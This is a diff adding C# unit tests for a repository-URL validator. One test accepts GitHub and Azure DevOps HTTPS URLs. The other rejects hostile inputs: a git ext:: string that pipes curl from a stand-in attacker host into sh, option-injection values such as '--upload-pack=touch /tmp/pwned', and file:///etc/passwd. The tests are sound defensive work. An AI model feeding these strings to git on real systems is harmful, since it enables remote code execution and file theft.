@@ -121,4 +121,41 @@ public class GitRepoUrlUtilsTests
         var result = GitRepoUrlUtils.TurnApiUrlToWebsite(url);
         result.Should().Be(url);
     }
+
+    [Test]
+    [TestCase("https://github.com/dotnet/aspnetcore")]
+    [TestCase("https://github.com/dotnet/aspnetcore.git")]
+    [TestCase("https://dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore")]
+    [TestCase("https://dnceng@dev.azure.com/dnceng/internal/_git/dotnet-aspnetcore")]
+    [TestCase("https://dnceng.visualstudio.com/internal/_git/dotnet-aspnetcore")]
+    public void IsValidRemoteRepoUri_AcceptsGitHubAndAzureDevOpsHttpsUrls(string uri)
+    {
+        GitRepoUrlUtils.IsValidRemoteRepoUri(uri).Should().BeTrue();
+    }
+
+    [Test]
+    // git transport-helper abuse (RCE)
+    [TestCase("ext::sh -c curl% -s% http://attacker/p|sh")]
+    [TestCase("fd::17/foo")]
+    [TestCase("ext::git-upload-pack")]
+    // scp-like SSH URL (SSH-SSRF)
+    [TestCase("git@github.com:dotnet/aspnetcore.git")]
+    [TestCase("user@attacker.internal:repo.git")]
+    // option injection (URL parsed as a git option)
+    [TestCase("--upload-pack=touch /tmp/pwned")]
+    [TestCase("-oProxyCommand=evil")]
+    // disallowed schemes / hosts
+    [TestCase("file:///etc/passwd")]
+    [TestCase("http://github.com/dotnet/aspnetcore")]
+    [TestCase("ssh://git@github.com/dotnet/aspnetcore")]
+    [TestCase("git://github.com/dotnet/aspnetcore")]
+    [TestCase("https://attacker.com/dotnet/aspnetcore")]
+    // local paths
+    [TestCase("/var/repos/aspnetcore")]
+    [TestCase("../../some/relative/path")]
+    [TestCase("")]
+    public void IsValidRemoteRepoUri_RejectsDangerousOrNonAllowlistedUris(string uri)
+    {
+        GitRepoUrlUtils.IsValidRemoteRepoUri(uri).Should().BeFalse();
+    }
 }
